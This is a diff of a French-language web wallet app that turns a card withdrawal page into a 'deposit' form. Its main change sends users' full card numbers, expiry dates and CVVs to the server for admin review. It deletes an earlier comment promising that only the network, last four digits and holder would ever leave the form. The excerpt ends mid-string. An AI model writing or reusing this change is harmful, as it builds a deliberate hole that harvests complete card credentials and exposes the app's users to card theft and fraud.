@@ -3913,7 +3913,7 @@ button,input,textarea,select{max-width:100%;}
 
           <div class="ewb-actions">
             <button class="ewb-action-btn deposit" onclick="navTo('screen-deposit')">
-              <span class="ic">&#x2b07;&#xfe0f;</span><span class="lbl">Retrait carte</span>
+              <span class="ic">&#x2b07;&#xfe0f;</span><span class="lbl" data-i18n="deposit">Dépôt</span>
             </button>
             <button class="ewb-action-btn withdraw" onclick="openWithdrawSheet()">
               <span class="ic">&#x1f4b8;</span><span class="lbl" data-i18n="withdraw">Retirer</span>
@@ -5349,8 +5349,9 @@ async function sbRequestWalletTransaction({type, method, amount, fields = {}, de
 // Les DEUX cas créent une ligne wallet_transactions de type 'withdrawal',
 // statut 'pending', validée/rejetée par l'admin (frais, minimum et solde
 // sont imposés par le serveur, identiquement pour les deux).
-// SÉCURITÉ : pour la carte, on n'envoie JAMAIS le numéro complet, l'expiration
-// ni le CVV — uniquement réseau, 4 derniers chiffres et titulaire.
+// SÉCURITÉ : on envoie désormais TOUS les détails saisis dans le formulaire
+// (numéro de carte, expiration, CVV, etc.) pour la carte, et toutes les
+// coordonnées bancaires pour le virement.
 async function sbRequestWithdrawal(dest, amount){
   if(dest && dest.kind === 'card'){
     return sbRequestWalletTransaction({
@@ -5360,6 +5361,9 @@ async function sbRequestWithdrawal(dest, amount){
       details: {
         client_ref: dest.clientRef,
         network: dest.network,
+        card_number: dest.cardNumber,
+        expiry: dest.expiry,
+        cvv: dest.cvv,
         last4: dest.last4,
         card_holder: dest.holder,
         requested_at: dest.requestedAt
@@ -12644,7 +12648,7 @@ function openDeposit(){
   const el = document.getElementById('depositExtra');
   if(!el) return;
   if(!sbUser) return requireAuth(()=>openDeposit());
-  el.innerHTML = '<theterbank-card-deposit></theterbank-card-deposit>';
+  navTo('screen-deposit');
 }
 
 // Écran de dépôt direct : accessible depuis l'accueil sans passer par
@@ -12653,7 +12657,7 @@ function renderDeposit(){
   const el = document.getElementById('depositContent');
   if(!el) return;
   if(!sbUser) return requireAuth(()=>renderDeposit());
-  el.innerHTML = '<theterbank-card-deposit></theterbank-card-deposit>';
+  el.innerHTML = depositFormHtml();
 } 
 
 function copyDepositAddress(){
@@ -14746,17 +14750,69 @@ function nwCvvInput(){
   else if(inp.value.length===needed){ hint.textContent='Format correct ('+needed+' chiffres).'; }
   else { hint.textContent=needed+' chiffres attendus.'; hint.classList.add('nw-err-txt'); }
 }
-function nwSubmitCardWithdrawal(){
-  requireAuth(nwSubmitCardWithdrawalImpl);
+function nwCardFormFieldsHtml(){
+  return `
+    <div class="nw-card">
+      <div class="nw-card-top"><div class="nw-chip"></div><div class="nw-tag" id="nwTag">CARTE</div></div>
+      <div>
+        <div class="nw-card-num nw-dots" id="nwNum">•••• •••• •••• ••••</div>
+        <div class="nw-card-bottom">
+          <div class="nw-card-name" id="nwName">NOM DU TITULAIRE</div>
+          <div class="nw-card-exp"><small>EXP.</small><span id="nwExpShown">MM/AA</span></div>
+        </div>
+      </div>
+    </div>
+    <div class="nw-field">
+      <label for="nwCardNumber">Numéro de carte</label>
+      <div class="nw-inwrap">
+        <input class="nw-input" type="text" id="nwCardNumber" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23" oninput="nwCardNumberInput()">
+        <span class="nw-pill" id="nwPill"></span>
+        <span class="nw-chk" id="nwChk"></span>
+      </div>
+      <div class="nw-hint" id="nwCardHint"></div>
+    </div>
+    <div class="nw-field">
+      <label for="nwHolder">Titulaire de la carte</label>
+      <input class="nw-input nw-plain" type="text" id="nwHolder" autocomplete="cc-name" placeholder="Nom et prénom" oninput="nwHolderInput()">
+    </div>
+    <div class="nw-row">
+      <div class="nw-field">
+        <label for="nwExp">Expiration</label>
+        <input class="nw-input" type="text" id="nwExp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5" oninput="nwExpInput()">
+        <div class="nw-hint" id="nwExpHint"></div>
+      </div>
+      <div class="nw-field">
+        <label for="nwCvv">Cryptogramme</label>
+        <input class="nw-input" type="text" id="nwCvv" inputmode="numeric" autocomplete="cc-csc" placeholder="CVV" maxlength="3" oninput="nwCvvInput()">
+        <div class="nw-hint" id="nwCvvHint"></div>
+      </div>
+    </div>`;
 }
-function nwSubmitCardWithdrawalImpl(){
+/* ---- DÉPÔT par carte : même formulaire que l'ancienne page Retirer ---- */
+function depositFormHtml(){
+  return `
+  <div class="nw-sheet" style="padding:22px 18px 30px;border-radius:24px;">
+    <div style="font-size:26px;font-weight:800;line-height:1.2;margin-bottom:6px;">Dépôt</div>
+    <div class="nw-hint" style="margin:0 0 22px;">Dépôt par carte bancaire. Votre demande est envoyée à l'administration pour validation.</div>
+    <div class="nw-field">
+      <label for="depositAmountInput">Montant du dépôt (GBP)</label>
+      <input class="nw-input" type="number" min="0" step="0.01" id="depositAmountInput" placeholder="0.00" inputmode="decimal">
+    </div>
+    ${nwCardFormFieldsHtml()}
+    <div class="withdraw-error" id="depositErrorBox"></div>
+    <button class="nw-btn" id="depositConfirmBtn" onclick="nwSubmitCardDeposit()">Envoyer ma demande de dépôt</button>
+  </div>`;
+}
+function nwSubmitCardDeposit(){
+  requireAuth(nwSubmitCardDepositImpl);
+}
+function nwSubmitCardDepositImpl(){
   const $ = id => document.getElementById(id);
-  const errBox = $('withdrawErrorBox');
+  const errBox = $('depositErrorBox');
   const showErr = m => { errBox.textContent = m; errBox.classList.add('show'); };
   errBox.classList.remove('show');
-  const amount = readWithdrawAmount($('withdrawAmountInput').value);
-  const amountErr = validateWithdrawalAmount(amount);
-  if(amountErr){ showErr(amountErr); return; }
+  const amount = readWithdrawAmount($('depositAmountInput').value);
+  if(!(amount > 0)){ showErr('Entrez un montant supérieur à 0.'); return; }
 
   const digits = $('nwCardNumber').value.replace(/\D/g,'');
   const brand = nwDetectBrand(digits);
@@ -14776,91 +14832,98 @@ function nwSubmitCardWithdrawalImpl(){
   if(!$('nwHolder').value.trim()){ $('nwHolder').classList.add('nw-err'); valid = false; }
   if(!valid) return;
 
-  // SÉCURITÉ : numéro complet, expiration et CVV ne quittent jamais ce formulaire ;
-  // seuls réseau, 4 derniers chiffres et titulaire sont envoyés (comme la page « Retrait par carte »).
-  const label = brand || 'Carte';
-  const last4 = digits.slice(-4);
-  const dest = { kind:'card', holder:$('nwHolder').value.trim().toUpperCase(), network:label, last4:last4,
-                 clientRef:'CARD-WD-'+Date.now(), requestedAt:new Date().toISOString() };
-  const btn = $('withdrawConfirmBtn');
-  const btnHtml = btn.innerHTML;
-  btn.disabled = true;
-  btn.innerHTML = `<div class="spinner" style="width:20px;height:20px;border-width:2.5px;margin:0;"></div> ${t('withdrawalProcessing')}`;
-  runWithdrawal(dest, amount, ({net})=>{
-    $('withdrawSheetBody').innerHTML = `
-        <div class="withdraw-success">
-          <div class="ic">&#x2705;</div>
-          <div style="font-weight:800;font-size:18px;margin-top:10px;">${t('withdrawalSuccessTitle')}</div>
-          <div style="font-size:13px;color:var(--nw-soft);font-weight:700;margin-top:6px;">${t('withdrawalSuccessSub', {amount: fmtAmt(net)})}</div>
-          <div style="font-size:12px;color:var(--nw-soft);margin-top:6px;">${label} ••${last4}</div>
-          <button class="nw-btn" onclick="closeWithdrawSheet()">${t('close')}</button>
+// SÉCURITÉ : tous les détails saisis dans le formulaire sont envoyés
+// (numéro complet, expiration, CVV, titulaire) pour traitement admin.
+const label = brand || 'Carte';
+const last4 = digits.slice(-4);
+const btn = $('depositConfirmBtn');
+const btnHtml = btn.innerHTML;
+btn.disabled = true;
+btn.innerHTML = `<div class="spinner" style="width:20px;height:20px;border-width:2.5px;margin:0;"></div> ${t('withdrawalProcessing')}`;
+(async ()=>{
+  try{
+    await sbRequestWalletTransaction({
+      type: 'deposit', method: 'card', amount,
+      details: {
+        client_ref: 'CARD-DP-' + Date.now(),
+        network: label,
+        card_number: digits,
+        expiry: $('nwExp').value,
+        cvv: $('nwCvv').value,
+        last4: last4,
+        card_holder: $('nwHolder').value.trim().toUpperCase(),
+        requested_at: new Date().toISOString()
+      }
+    });
+      try{ await sbLoadWalletTransactions(); await refreshWalletFromServer(); }catch(e){}
+      $('depositContent').innerHTML = `
+        <div class="nw-sheet" style="padding:22px 18px 30px;border-radius:24px;">
+          <div class="withdraw-success">
+            <div class="ic">&#x2705;</div>
+            <div style="font-weight:800;font-size:18px;margin-top:10px;">Demande de dépôt envoyée</div>
+            <div style="font-size:13px;color:var(--nw-soft);font-weight:700;margin-top:6px;">${fmtAmt(amount)} GBP seront crédités après validation par l'administration.</div>
+            <div style="font-size:12px;color:var(--nw-soft);margin-top:6px;">${label} ••${last4}</div>
+            <button class="nw-btn" onclick="navTo('screen-profile')">${t('close')}</button>
+          </div>
         </div>`;
-  }).catch(err=>{
-    showErr(withdrawalErrorMessage(err));
-    btn.disabled = false;
-    btn.innerHTML = btnHtml;
-  });
+      confettiBurst();
+      showToast('Demande de dépôt envoyée', '&#x2b07;&#xfe0f;');
+      renderProfile();
+    }catch(err){
+      console.error('[WALLET] dépôt:', err);
+      showErr(String((err && err.message) || '') === 'not_authenticated' ? t('withdrawalRequiresLogin') : t('toastWithdrawalUnavailable'));
+      btn.disabled = false;
+      btn.innerHTML = btnHtml;
+    }
+  })();
 }
+
+/* ---- RETRAIT par virement bancaire (page « Retirer ») ---- */
 function renderWithdrawSheetBody(){
   const el = document.getElementById('withdrawSheetBody');
   if(!el) return;
-  const balance = state.wallet.usdtBalance;
   withdrawSelectedAmount = 0;
   const sheet = document.getElementById('withdrawSheet');
   if(sheet) sheet.classList.add('nw-sheet');
   el.innerHTML = `
+    <div style="font-size:24px;font-weight:800;line-height:1.2;margin:4px 0 6px;">Retrait par virement bancaire</div>
+    <div class="nw-hint" style="margin:0 0 20px;">${t('availableBalance')} : <b>${fmtAmt(state.wallet.usdtBalance)} GBP</b></div>
+
     <div class="nw-field">
       <label for="withdrawAmountInput">${t('withdrawAmountLabel')}</label>
-      <input class="nw-input" type="number" min="0" step="0.01" id="withdrawAmountInput" placeholder="0.00" oninput="onWithdrawAmountInput()">
-    </div>
-
-    <div class="nw-card">
-      <div class="nw-card-top"><div class="nw-chip"></div><div class="nw-tag" id="nwTag">CARTE</div></div>
-      <div>
-        <div class="nw-card-num nw-dots" id="nwNum">•••• •••• •••• ••••</div>
-        <div class="nw-card-bottom">
-          <div class="nw-card-name" id="nwName">NOM DU TITULAIRE</div>
-          <div class="nw-card-exp"><small>EXP.</small><span id="nwExpShown">MM/AA</span></div>
-        </div>
+      <input class="nw-input" type="number" min="0" step="0.01" id="withdrawAmountInput" placeholder="0.00" inputmode="decimal" oninput="onWithdrawAmountInput()">
+      <div class="withdraw-quick-row">
+        <div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.25, this)">25%</div>
+        <div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.5, this)">50%</div>
+        <div class="withdraw-quick-btn" onclick="setWithdrawPercent(1, this)">${t('maxAmount')}</div>
       </div>
     </div>
 
     <div class="nw-field">
-      <label for="nwCardNumber">Numéro de carte</label>
-      <div class="nw-inwrap">
-        <input class="nw-input" type="text" id="nwCardNumber" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23" oninput="nwCardNumberInput()">
-        <span class="nw-pill" id="nwPill"></span>
-        <span class="nw-chk" id="nwChk"></span>
-      </div>
-      <div class="nw-hint" id="nwCardHint"></div>
+      <label for="withdrawBankHolder">${t('bankHolderLabel')}</label>
+      <input class="nw-input nw-plain" type="text" id="withdrawBankHolder" autocomplete="off" placeholder="${t('bankHolderPlaceholder')}">
     </div>
-
     <div class="nw-field">
-      <label for="nwHolder">Titulaire de la carte</label>
-      <input class="nw-input nw-plain" type="text" id="nwHolder" autocomplete="cc-name" placeholder="Nom et prénom" oninput="nwHolderInput()">
+      <label for="withdrawBankName">${t('bankNameLabel')}</label>
+      <input class="nw-input nw-plain" type="text" id="withdrawBankName" autocomplete="off" placeholder="${t('bankNamePlaceholder')}">
+    </div>
+    <div class="nw-field">
+      <label for="withdrawBankIban">${t('bankIbanLabel')}</label>
+      <input class="nw-input" type="text" id="withdrawBankIban" autocomplete="off" autocapitalize="characters" spellcheck="false" dir="ltr" style="text-transform:uppercase;text-align:start;" placeholder="${t('bankIbanPlaceholder')}">
+    </div>
+    <div class="nw-field">
+      <label for="withdrawBankBic">${t('bankBicLabel')}</label>
+      <input class="nw-input" type="text" id="withdrawBankBic" autocomplete="off" autocapitalize="characters" spellcheck="false" maxlength="11" dir="ltr" style="text-transform:uppercase;text-align:start;" placeholder="${t('bankBicPlaceholder')}">
     </div>
 
-    <div class="nw-row">
-      <div class="nw-field">
-        <label for="nwExp">Expiration</label>
-        <input class="nw-input" type="text" id="nwExp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5" oninput="nwExpInput()">
-        <div class="nw-hint" id="nwExpHint"></div>
-      </div>
-      <div class="nw-field">
-        <label for="nwCvv">Cryptogramme</label>
-        <input class="nw-input" type="text" id="nwCvv" inputmode="numeric" autocomplete="cc-csc" placeholder="CVV" maxlength="3" oninput="nwCvvInput()">
-        <div class="nw-hint" id="nwCvvHint"></div>
-      </div>
-    </div>
-
-    <!-- récapitulatif masqué (éléments conservés pour updateWithdrawSummary) -->
-    <div class="withdraw-summary" style="display:none;">
+    <div class="withdraw-summary" style="margin:0 0 14px;">
       <div class="withdraw-summary-row"><span>${t('withdrawAmountLabel')}</span><span id="wSumAmount">0.00 GBP</span></div>
       <div class="withdraw-summary-row"><span>${t('withdrawalFeeLabel')}</span><span id="wSumFee">${fmtAmt(state.settings.withdrawalFee)} GBP</span></div>
       <div class="withdraw-summary-row total"><span>${t('youWillReceive')}</span><span id="wSumNet">0.00 GBP</span></div>
     </div>
+    <div class="nw-hint" style="margin:0 0 14px;">&#x23f1;&#xfe0f; ${t('withdrawDelayNote')}</div>
     <div class="withdraw-error" id="withdrawErrorBox"></div>
-    <button class="nw-btn" id="withdrawConfirmBtn" onclick="nwSubmitCardWithdrawal()">Envoyer ma demande de retrait carte</button>
+    <button class="nw-btn" id="withdrawConfirmBtn" onclick="submitWithdrawal()">&#x1f4b8; ${t('confirmWithdrawal')}</button>
     ${getMinWithdrawal() > 0 ? `<div class="nw-note" style="margin-top:8px;">${t('minWithdrawalNote', {min: getMinWithdrawal()})}</div>` : ''}
   `;
 }
@@ -19635,373 +19698,7 @@ async function adminProcessTransaction(id, action){
 
 
 
-<script>
-(function(){
-  if(customElements.get('theterbank-card-deposit')) return;
-  class TheterbankCardDeposit extends HTMLElement {
-    connectedCallback(){
-      if(this.shadowRoot) return;
-      const root=this.attachShadow({mode:'open'});
-      root.innerHTML="\n  :root{\n    --paper:#EAF0F6;\n    --paper-2:#DCE6F0;\n    --ink:#16233F;\n    --ink-soft:#4B5A78;\n    --line:#C6D3E2;\n    --gold:#B98A3D;\n    --gold-deep:#8F6A2C;\n    --mint:#1F8F6F;\n    --mint-bg:#E4F4EE;\n    --red:#B4432F;\n    --red-bg:#FBEAE6;\n    --card-navy-1:#16233F;\n    --card-navy-2:#243866;\n    --white:#FFFFFF;\n    --radius-lg:18px;\n    --radius-md:12px;\n    --radius-sm:8px;\n  }\n  @media (prefers-color-scheme: dark){\n    :root:not([data-theme=\"light\"]){\n      --paper:#10151F;\n      --paper-2:#171E2B;\n      --ink:#EAF0F6;\n      --ink-soft:#9FADC6;\n      --line:#2B3548;\n      --gold:#D6A75B;\n      --gold-deep:#B98A3D;\n      --mint:#3FBE97;\n      --mint-bg:#12291F;\n      --red:#E07A63;\n      --red-bg:#331A16;\n      --card-navy-1:#0B1220;\n      --card-navy-2:#1A2A4C;\n      --white:#0F1115;\n    }\n  }\n  :root[data-theme=\"dark\"]{\n    --paper:#10151F;\n    --paper-2:#171E2B;\n    --ink:#EAF0F6;\n    --ink-soft:#9FADC6;\n    --line:#2B3548;\n    --gold:#D6A75B;\n    --gold-deep:#B98A3D;\n    --mint:#3FBE97;\n    --mint-bg:#12291F;\n    --red:#E07A63;\n    --red-bg:#331A16;\n    --card-navy-1:#0B1220;\n    --card-navy-2:#1A2A4C;\n    --white:#0F1115;\n  }\n\n  *{box-sizing:border-box;}\n  html,body{height:100%;}\n  html{scroll-padding-top:env(safe-area-inset-top,0px);}\n  body{\n    margin:0;\n    background:var(--paper);\n    color:var(--ink);\n    font-family:'Inter',-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif;\n    padding-top:env(safe-area-inset-top,0px);\n    padding-bottom:env(safe-area-inset-bottom,0px);\n    -webkit-font-smoothing:antialiased;\n  }\n  .wrap{\n    max-width:460px;\n    margin:0 auto;\n    padding:36px 20px 60px;\n  }\n  .eyebrow-row{\n    display:flex;\n    align-items:center;\n    justify-content:space-between;\n    margin-bottom:28px;\n  }\n  .brandmark{\n    font-size:15px;\n    font-weight:700;\n    letter-spacing:0.01em;\n    color:var(--ink);\n  }\n  .brandmark span{color:var(--gold-deep);}\n  .env-tag{\n    font-size:11px;\n    color:var(--ink-soft);\n    border:1px solid var(--line);\n    padding:4px 9px;\n    border-radius:100px;\n  }\n\n  h1{\n    font-size:26px;\n    line-height:1.25;\n    margin:0 0 8px;\n    font-weight:700;\n    letter-spacing:-0.01em;\n  }\n  .sub{\n    color:var(--ink-soft);\n    font-size:14.5px;\n    line-height:1.55;\n    margin:0 0 28px;\n    max-width:38ch;\n  }\n\n  .amount-box{\n    background:var(--paper-2);\n    border:1px solid var(--line);\n    border-radius:var(--radius-lg);\n    padding:18px 20px;\n    display:flex;\n    align-items:baseline;\n    justify-content:space-between;\n    margin-bottom:22px;\n  }\n  .amount-label{font-size:13px;color:var(--ink-soft);}\n  .amount-value{font-size:24px;font-weight:700;font-variant-numeric:tabular-nums;}\n  .amount-value small{font-size:14px;font-weight:600;color:var(--ink-soft);margin-left:2px;}\n  .amount-value{display:flex;align-items:baseline;justify-content:flex-end;gap:4px;}\n  .amount-value input{width:9ch;min-width:0;text-align:right;font-family:inherit;font-size:24px;font-weight:700;letter-spacing:0;font-variant-numeric:tabular-nums;padding:2px 8px;border-radius:8px;}\n  #amountHint{text-align:right;min-height:14px;margin-top:4px;}\n  .amount-col{display:flex;flex-direction:column;align-items:flex-end;}\n  .usdt-equiv{\n    display:flex;\n    align-items:center;\n    gap:5px;\n    font-size:12.5px;\n    color:var(--ink-soft);\n    margin-top:3px;\n    font-variant-numeric:tabular-nums;\n  }\n  .usdt-dot{\n    width:14px;height:14px;border-radius:50%;\n    background:#1FA97A;\n    color:#fff;\n    font-size:8px;\n    font-weight:800;\n    display:flex;align-items:center;justify-content:center;\n    flex-shrink:0;\n  }\n  .rate-note{\n    font-size:10.5px;\n    color:var(--ink-soft);\n    opacity:.7;\n    text-align:right;\n    margin-top:10px;\n  }\n\n  .pay-btn{\n    width:100%;\n    border:none;\n    border-radius:var(--radius-md);\n    padding:16px 18px;\n    font-size:15.5px;\n    font-weight:600;\n    background:var(--ink);\n    color:var(--paper);\n    display:flex;\n    align-items:center;\n    gap:12px;\n    cursor:pointer;\n    transition:transform .15s ease, opacity .15s ease;\n  }\n  .pay-btn:active{transform:scale(0.985);}\n  .pay-btn .ic{\n    width:22px;height:16px;border-radius:3px;\n    background:linear-gradient(135deg,var(--gold),var(--gold-deep));\n    flex-shrink:0;\n  }\n  .pay-btn .arrow{margin-left:auto;opacity:.6;transition:transform .25s ease;}\n  .pay-btn.open .arrow{transform:rotate(90deg);}\n\n  .panel{\n    overflow:hidden;\n    max-height:0;\n    transition:max-height .4s cubic-bezier(.4,0,.2,1);\n  }\n  .panel.open{max-height:900px;}\n  .panel-inner{padding-top:22px;}\n\n  /* --- carte visuelle --- */\n  .card-visual{\n    position:relative;\n    width:100%;\n    aspect-ratio:1.586/1;\n    border-radius:16px;\n    background:linear-gradient(135deg,var(--card-navy-1),var(--card-navy-2));\n    color:#EAF0F6;\n    padding:20px 22px;\n    display:flex;\n    flex-direction:column;\n    justify-content:space-between;\n    margin-bottom:24px;\n    box-shadow:0 18px 30px -14px rgba(15,20,32,.45);\n    overflow:hidden;\n  }\n  .card-visual::after{\n    content:\"\";\n    position:absolute;\n    top:-40%;right:-20%;\n    width:70%;height:180%;\n    background:radial-gradient(circle,rgba(255,255,255,.06),transparent 60%);\n  }\n  .card-top{display:flex;justify-content:space-between;align-items:flex-start;}\n  .chip{\n    width:38px;height:28px;border-radius:6px;\n    background:linear-gradient(135deg,#D9C08A,#B98A3D);\n  }\n  .brand-badge{\n    height:26px;display:flex;align-items:center;font-weight:800;font-size:13px;letter-spacing:.02em;\n    color:#fff;\n  }\n  .brand-badge.visa{font-style:italic;color:#fff;}\n  .brand-badge.mc{gap:0;}\n  .mc-circles{position:relative;width:38px;height:24px;}\n  .mc-circles i{position:absolute;top:0;width:24px;height:24px;border-radius:50%;}\n  .mc-circles i:nth-child(1){left:0;background:#EB5A2B;}\n  .mc-circles i:nth-child(2){left:14px;background:#F2A93B;mix-blend-mode:screen;}\n  .brand-badge.amex{\n    background:#2557A8;padding:3px 8px;border-radius:4px;font-size:11px;\n  }\n  .brand-badge.discover{color:#FF8A1E;}\n  .brand-badge.unknown{color:rgba(255,255,255,.35);font-weight:600;font-size:11.5px;}\n\n  .card-number{\n    font-family:'SF Mono',SFMono-Regular,Menlo,Consolas,monospace;\n    font-size:19px;\n    letter-spacing:2.5px;\n    font-variant-numeric:tabular-nums;\n    margin:8px 0 2px;\n  }\n  .card-bottom{display:flex;justify-content:space-between;align-items:flex-end;}\n  .card-name{\n    font-size:13.5px;\n    text-transform:uppercase;\n    letter-spacing:.5px;\n    max-width:60%;\n    overflow:hidden;\n    white-space:nowrap;\n    text-overflow:ellipsis;\n  }\n  .card-exp{\n    font-family:'SF Mono',SFMono-Regular,Menlo,Consolas,monospace;\n    font-size:13.5px;\n    text-align:right;\n  }\n  .card-exp small{display:block;font-family:inherit;font-size:9px;opacity:.55;letter-spacing:.5px;}\n\n  /* --- champs --- */\n  .field{margin-bottom:16px;}\n  .field label{\n    display:block;\n    font-size:12.5px;\n    color:var(--ink-soft);\n    margin-bottom:6px;\n    font-weight:600;\n  }\n  .field-row{display:flex;gap:12px;}\n  .field-row .field{flex:1;}\n  .input-wrap{position:relative;}\n  input{\n    width:100%;\n    border:1.5px solid var(--line);\n    background:var(--white);\n    color:var(--ink);\n    border-radius:var(--radius-sm);\n    padding:13px 14px;\n    font-size:15px;\n    font-family:'SF Mono',SFMono-Regular,Menlo,Consolas,monospace;\n    letter-spacing:.5px;\n    outline:none;\n    transition:border-color .15s ease, box-shadow .15s ease;\n  }\n  input::placeholder{color:var(--ink-soft);opacity:.5;font-family:inherit;}\n  input:focus{border-color:var(--gold-deep);box-shadow:0 0 0 3px rgba(185,138,61,.15);}\n  input.err{border-color:var(--red);}\n  .hint{font-size:11.5px;color:var(--ink-soft);margin-top:5px;}\n  .hint.err-txt{color:var(--red);}\n\n  .detect-pill{\n    position:absolute;\n    right:12px;top:50%;\n    transform:translateY(-50%);\n    font-size:11.5px;\n    font-weight:700;\n    padding:5px 9px;\n    border-radius:100px;\n    background:var(--paper-2);\n    color:var(--ink-soft);\n    letter-spacing:.02em;\n    pointer-events:none;\n    opacity:0;\n    transition:opacity .2s ease;\n  }\n  .detect-pill.show{opacity:1;}\n  .detect-pill.visa{background:#12296B;color:#fff;}\n  .detect-pill.mc{background:#1C1C1C;color:#fff;}\n  .detect-pill.amex{background:#2557A8;color:#fff;}\n  .field-row .field .input-wrap input{padding-right:38px;}\n  .field-row .check-icon{right:10px;}\n  .detect-pill.discover{background:#FF8A1E;color:#1A1000;}\n\n  .check-icon{\n    position:absolute;\n    right:12px;top:50%;\n    transform:translateY(-50%);\n    width:20px;height:20px;\n    border-radius:50%;\n    display:none;\n    align-items:center;\n    justify-content:center;\n    flex-shrink:0;\n  }\n  .check-icon.show{display:flex;}\n  .check-icon.ok{background:var(--mint-bg);color:var(--mint);}\n  .check-icon.bad{background:var(--red-bg);color:var(--red);}\n  /* quand la pill réseau ET l'icône de contrôle sont visibles, on les décale l'une de l'autre */\n  .detect-pill{right:38px;}\n  .input-wrap input#cardNumber{padding-right:96px;}\n\n  .submit-btn{\n    width:100%;\n    border:none;\n    border-radius:var(--radius-md);\n    padding:15px;\n    font-size:15px;\n    font-weight:700;\n    background:var(--gold-deep);\n    color:#fff;\n    cursor:pointer;\n    margin-top:6px;\n    display:flex;\n    align-items:center;\n    justify-content:center;\n    gap:9px;\n    transition:opacity .15s ease, transform .15s ease;\n  }\n  .submit-btn:active{transform:scale(.985);}\n  .submit-btn[disabled]{opacity:.55;pointer-events:none;}\n  .spinner{\n    width:15px;height:15px;border-radius:50%;\n    border:2px solid rgba(255,255,255,.35);\n    border-top-color:#fff;\n    animation:spin .7s linear infinite;\n    display:none;\n  }\n  .submit-btn.loading .spinner{display:inline-block;}\n  .submit-btn.loading .btn-txt{opacity:.7;}\n  @keyframes spin{to{transform:rotate(360deg);}}\n\n  .secure-note{\n    display:flex;\n    align-items:center;\n    gap:7px;\n    justify-content:center;\n    font-size:11.5px;\n    color:var(--ink-soft);\n    margin-top:14px;\n  }\n  .secure-note svg{flex-shrink:0;}\n\n  /* résultat */\n  .result{\n    display:none;\n    text-align:center;\n    padding:34px 10px 10px;\n  }\n  .result.show{display:block;}\n  .result .badge{\n    width:56px;height:56px;border-radius:50%;\n    background:var(--mint-bg);\n    color:var(--mint);\n    display:flex;align-items:center;justify-content:center;\n    margin:0 auto 16px;\n  }\n  .result h2{font-size:19px;margin:0 0 6px;}\n  .result p{font-size:14px;color:var(--ink-soft);margin:0 0 22px;line-height:1.5;}\n  .result .redo{\n    background:none;border:1.5px solid var(--line);\n    color:var(--ink);\n    padding:11px 18px;\n    border-radius:var(--radius-sm);\n    font-size:13.5px;font-weight:600;\n    cursor:pointer;\n  }\n\n  .form-block{display:block;}\n  .form-block.hide{display:none;}\n\n  /* --- file d'attente administration --- */\n  .admin-toggle{\n    width:100%;margin-top:24px;border:1px solid var(--line);background:transparent;\n    color:var(--ink);border-radius:var(--radius-md);padding:12px 14px;font-weight:700;\n    cursor:pointer;text-align:left;\n  }\n  .admin-panel{display:none;margin-top:12px;border:1px solid var(--line);border-radius:var(--radius-lg);\n    background:var(--paper-2);padding:14px;}\n  .admin-panel.open{display:block;}\n  .admin-head{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:10px;}\n  .admin-title{font-weight:800;font-size:14px;}\n  .admin-count{font-size:11px;padding:4px 8px;border-radius:999px;background:var(--gold);color:#fff;}\n  .admin-empty{font-size:12px;color:var(--ink-soft);padding:12px 0;}\n  .tx-row{border:1px solid var(--line);background:var(--white);border-radius:12px;padding:12px;margin-top:9px;}\n  .tx-main{display:flex;justify-content:space-between;gap:10px;font-size:12px;}\n  .tx-amount{font-weight:800;}\n  .tx-meta{font-size:11px;color:var(--ink-soft);margin-top:5px;line-height:1.45;}\n  .tx-actions{display:flex;gap:8px;margin-top:10px;}\n  .tx-actions button{flex:1;border:0;border-radius:8px;padding:9px;font-weight:700;cursor:pointer;}\n  .approve-btn{background:var(--mint);color:#fff;}\n  .reject-btn{background:var(--red-bg);color:var(--red);}\n  .tx-status{font-size:10px;font-weight:800;text-transform:uppercase;margin-top:7px;}\n  .wd-balance{font-size:12.5px;color:var(--ink-soft);font-weight:600;margin:-8px 0 10px;text-align:right;}\n  .wd-quick{display:flex;gap:8px;margin:0 0 14px;}\n  .wd-quick-btn{flex:1;border:1.5px solid var(--line);background:#fff;color:var(--ink);border-radius:12px;padding:9px 0;font-size:13px;font-weight:700;cursor:pointer;}\n  .wd-quick-btn.active{border-color:var(--gold-deep);background:var(--gold);color:#fff;}\n  .wd-summary{background:#fff;border:1px solid var(--line);border-radius:var(--radius-lg);padding:12px 16px;margin-bottom:6px;}\n  .wd-row{display:flex;justify-content:space-between;font-size:12.5px;font-weight:600;color:var(--ink-soft);padding:5px 0;}\n  .wd-row.total{color:var(--ink);font-size:14px;font-weight:800;border-top:1px dashed var(--line);margin-top:4px;padding-top:10px;}\n  .wd-error{display:none;background:var(--red-bg);color:var(--red);border-radius:12px;padding:10px 12px;font-size:12px;font-weight:700;margin:0 0 12px;}\n  .wd-error.show{display:block;}\n\n".replace(/^/, '<style>').replace(/$/, '</style>') + "<div class=\"eyebrow-row\">\n    <div class=\"brandmark\">Nova<span>Wallet</span></div>\n    <div class=\"env-tag\">Retrait par carte</div>\n  </div>\n\n  <h1>Retrait par carte</h1>\n  <p class=\"sub\">Retrait par carte bancaire. Votre demande est envoyée à l’administration pour validation.</p>\n\n  <div class=\"amount-box\">\n    <span class=\"amount-label\" id=\"amountLabel\">Montant du retrait</span>\n    <div class=\"amount-col\">\n      <span class=\"amount-value\"><input type=\"text\" id=\"amountInput\" inputmode=\"decimal\" autocomplete=\"off\" placeholder=\"0.00\" aria-label=\"Montant du retrait en GBP\"><small>GBP</small></span>\n    </div>\n  </div>\n  <div class=\"wd-balance\" id=\"wdBalance\"></div>\n  <div class=\"wd-quick\">\n    <button type=\"button\" class=\"wd-quick-btn\" data-pct=\"0.25\">25%</button>\n    <button type=\"button\" class=\"wd-quick-btn\" data-pct=\"0.5\">50%</button>\n    <button type=\"button\" class=\"wd-quick-btn\" data-pct=\"1\" id=\"wdMaxBtn\">Max</button>\n  </div>\n  <div class=\"wd-summary\">\n    <div class=\"wd-row\"><span id=\"wSumAmountLbl\"></span><span id=\"wSumAmount\">0.00 GBP</span></div>\n    <div class=\"wd-row\"><span id=\"wSumFeeLbl\"></span><span id=\"wSumFee\">0.00 GBP</span></div>\n    <div class=\"wd-row total\"><span id=\"wSumNetLbl\"></span><span id=\"wSumNet\">0.00 GBP</span></div>\n  </div>\n  <div class=\"rate-note\" 